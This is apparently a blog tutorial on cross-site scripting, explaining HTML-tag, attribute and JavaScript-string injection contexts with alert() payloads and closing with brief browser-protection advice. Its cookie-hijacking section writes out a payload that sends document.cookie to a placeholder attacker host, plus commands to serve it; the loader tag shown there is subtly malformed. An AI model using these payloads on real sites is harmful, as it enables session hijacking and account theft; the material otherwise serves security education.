## Introduction

One of the most common vulnerabilities on the modern web pages is XSS, with the revolution of JS and their frameworks and libraries, there started to be a  vulnerability called `Cross Site Scripting`, as most of the vulnerabilities, they are made by bad practices, most of the time the bad practices are there just by ignorance, but warning the programmers how it works, how it gets exploited and how prevent that, we can void a lot of cyber-crimes and a lot of data stolen.

## WHAT IS XSS?

`XSS` or `Cross Site Scripting` is the vulnerability that allows the attacker to insert `JavaScript` code without authorization, it can involve attacks like `sessions hijacking`, `Defacements`, `Phishings`, or even  `malware distribution` or injection of `trojans` into the functionality of the web app, but how can it be possible? The problem is in the input that the client can introduce, if the developer doesn't restrict the input, the client could introduce sources not wanted as new tags, or change the structure of a script through the sink of  the own script.

    </div>

## HOW TO FIND A WAY TO EXPLOIT XSS 

The first step will be always find a way to insert Javascript code in the website, to do this we need to first know how to read contexts of websites and analyze them. Any website is a whole world with a lot of technologies, services, libreries, etc; It is important to have skills with JS, HTML, CSS and some libreries as AngulasJS, JQuery to be good finding those types of vulnerabilities. in the next section, we will see some types of common contexts that allow us exploit those vulnerabilities.

### CONTEXTS

We are going to analyze the most common context of XSS and how to find them in our targets, so we can know how could it be exploited.

#### XSS between HTML tags


The easiest XSS to execute is the XSS between HTML tags. Supose you have an form like this one:

```html
<form action="[/post/comment](view-source:https://example.net/post/comment)" method="POST" enctype="application/x-www-form-urlencoded"> 
	<input required type="hidden" name="csrf" value="KejLnGzcJtUlkOWdCq9jHZqHeSGpRXKL">
	<input required type="hidden" name="postId" value="1">
	<label>Comment:</label> 
	<textarea required rows="12" cols="300" name="comment">
	</textarea>
	<label>Name:</label> 
	<input required type="text" name="name"> 
	<label>Email:</label> <input required type="email" name="email">
	<label>Website:</label> <input pattern="(http:|https:).+" type="text" name="website"> 
	<button class="button" type="submit">Post Comment</button> </form>
</form>
```

As we can see, it sends a request to `/post/comment` with a `POST` method to post our comment, so we can analyze how our comment would look like in the frontEnd of the website:

```html
<hr> 
	<h1>Comments</h1>
	<section class="comment"> 
		<p> 
		<img src="[/resources/images/avatarDefault.svg](view-source:https://example.net/resources/images/avatarDefault.svg)" class="avatar"> Phil MaChartin | 29 May 2025 
		</p> 
		<p>This is a comment</p> 
		<p> </p> 
	</section> 
	<section class="comment"> 
		<p>
		<img src="[/resources/images/avatarDefault.svg](view-source:https://example.net/resources/images/avatarDefault.svg)" class="avatar"> Paul Amuscle | 12 June 2025
		</p> 
		<p>This is a comment</p> 
		<p></p>
	</section>
<hr>
```

So analyzing the comment sections, we can have a conclusion, and it is we can put a tag inside of a tag as comment. We can try to put a image, an encase that the image doesn't load, it can run an event (Javascript):

```html
<img src="PWNED" onerror="alert('PWNED')">
```

and it would look like this in our section comment

```html
<hr> 
	<h1>Comments</h1>
	<section class="comment"> 
		<p> 
		<img src="[/resources/images/avatarDefault.svg](view-source:https://example.net/resources/images/avatarDefault.svg)" class="avatar">  MaChartin | 29 May 2025 
		</p> 
		<p>This is a comment</p> 
		<p> </p> 
	</section> 
	<section class="comment"> 
		<p>
		<img src="[/resources/images/avatarDefault.svg](view-source:https://example.net/resources/images/avatarDefault.svg)" class="avatar">  Amuscle | 12 June 2025
		</p> 
		<p>This is a comment</p> 
		<p></p>
	</section>
	<section class="comment"> 
		<p>
		<img src="[/resources/images/avatarDefault.svg](view-source:https://example.net/resources/images/avatarDefault.svg)" class="avatar"> HACKER | 31 Octuber 2025
		</p> 
		<p><img src="PWNED" onerror="alert('PWNED')"></p> 
		<p></p>
	</section>
</hr>
```
 

#### XSS in HTML tag attributes

Other common case can be a XSS in a HTML tag attribute, a serious bad error in web programming is allow the client write on the HTML tag attributes, because a person could break those tags to then insect any other HTML code, for instance, suppose be able to write a `data-user` atribute in a `<section>` tag by a form:

```html
<hr> 
	<h1>Comments</h1>
	<section class="comment" user-data="MaChartin"> 
		<p> 
		<img src="[/resources/images/avatarDefault.svg](view-source:https://example.net/resources/images/avatarDefault.svg)" class="avatar">  MaChartin | 29 May 2025 
		</p> 
		<p>This is a comment</p> 
		<p> </p> 
	</section> 
	<section class="comment" user-data="Amuscle"> 
		<p>
		<img src="[/resources/images/avatarDefault.svg](view-source:https://example.net/resources/images/avatarDefault.svg)" class="avatar">  Amuscle | 12 June 2025
		</p> 
		<p>This is a comment</p> 
		<p></p>
	</section>
</hr>
<br>
<form action="[/post/comment](view-source:https://example.net/post/comment)" method="POST" enctype="application/x-www-form-urlencoded"> 
	<input required type="hidden" name="csrf" value="KejLnGzcJtUlkOWdCq9jHZqHeSGpRXKL">
	<input required type="hidden" name="postId" value="1">
	<label>Comment:</label> 
	<textarea required rows="12" cols="300" name="comment">
	</textarea>
	<label>Name:</label> 
	<input required type="text" name="name"> 
	<label>Email:</label> <input required type="email" name="email">
	<label>Website:</label> <input pattern="(http:|https:).+" type="text" name="website"> 
	<button class="button" type="submit">Post Comment</button> </form>
</form>
```

We as hackers could break that attribute to write more attributes or literally more tags, we would just add  `user"` as name in the form, and that would break the attribute, so we can add other atribute and *NOT* add the last quote to build the full tag again.

```Payload
PWNED" onmouseover="alert('PWNED')
```

And our section would look like this

```html
	<section class="comment" user-data="PWNED" onmouseover="alert('PWNED')"> 
		<p>
		<img src="[/resources/images/avatarDefault.svg](view-source:https://example.net/resources/images/avatarDefault.svg)" class="avatar">  PWNED" onmouseover="alert('PWNED') | 03 June 2025
		</p> 
		<p>PWNED</p> 
		<p></p>
	</section>
```

we can also do something that too few programmers know that is possible, and it is call Javascript inside of an attribute, it would be like this:

```html
<section class="comment" user-data="javascript:alert('PWNED')">
```


#### XSS into JavaScript

Other context that is pretty common is XSS into own Javascript scripts. A  programmer can make an script to write comments in the section to then show it in the frontEnd from our input, like this:

```js
let comment = 'My comment';
```

So it will be procces in a way so then it will be showed in the comment section like this

```html
<p>My comment</p>
```

So we can analyze the script again and figure out we can break the quotes to then inject more JS code:

```js
let comment = "My comment"; alert(1); //"
```

So when the browser execute the JS script, it will take the comment and it will run `alert(1)`, and that's how we could inject a XSS in a JavaScript script.



## WAY TO EXPLOIT XSS BY COOKIES HIJACKING 

There are a lot of ways to take vantage of a XSS, the most common is `Cookies Hijacking`. It consist in be able to hijack a whole session without passwords or 2FA by cookies. let's see how we can do this.

First you need to have an application in your attacker system to collect cookies (I made mine as example, you can look at it in this URL -> [https://github.com/j4f3th/cookiesMonster/](https://github.com/j4f3th/cookiesMonster/)) , then you can make a web server which brings the payload to the victim web page:


```bash
$ echo 'new Image().src='http://IP:PORT_ATTACKER_APP/index.php?c='+document.cookie;' > payload.js
$ php -S IP:PORT
[Thu Jun 19 21:32:44 2025] PHP 8.3.6 Development Server (http://IP:PORT) started
```

then you insert the payload in your XSS attack:

```bash
<img src="PWNED" onerror="http://IP:PORT/payload.js">
```


Then just wait to get cookies:

<div>
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/posts/HowtoXSS/cookiesmonster.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>
</div>




## Conclusion

This type of vulnerability is pretty important to void in actual web application, it can compromise the security of any user in that application, people cannot only get cookies, people can get Bank info as Credit Cards or Debit Cards or any type of info from the server. A good way to protect yourself is using addons as [NoScript](https://noscript.net/), not collecting cookies in your browser, or use secure browsers as `LibreWolf` or `Brave` with options to don't collect cookies and block scripts.
